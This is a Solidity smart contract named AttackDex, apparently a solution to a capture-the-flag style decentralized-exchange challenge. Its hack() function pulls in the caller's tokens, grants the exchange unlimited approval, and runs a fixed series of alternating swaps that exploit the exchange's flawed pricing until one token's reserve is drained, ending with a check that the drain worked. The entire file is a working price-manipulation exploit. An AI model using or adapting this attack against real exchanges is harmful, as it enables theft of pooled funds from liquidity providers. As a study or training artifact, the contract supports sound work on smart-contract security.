// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IDex {
    function swap(address, address, uint256) external;
    function getSwapPrice(address, address, uint256) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract AttackDex {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function hack() external {
        // Sending our tokens to this contract
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // Approve the max amount of tokens
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // Price manipulation time
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);

        // At this point, according to our math, we only need to swap 45 tokens to drain all of token1
        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "Price manipulation attack failed");
    }
}
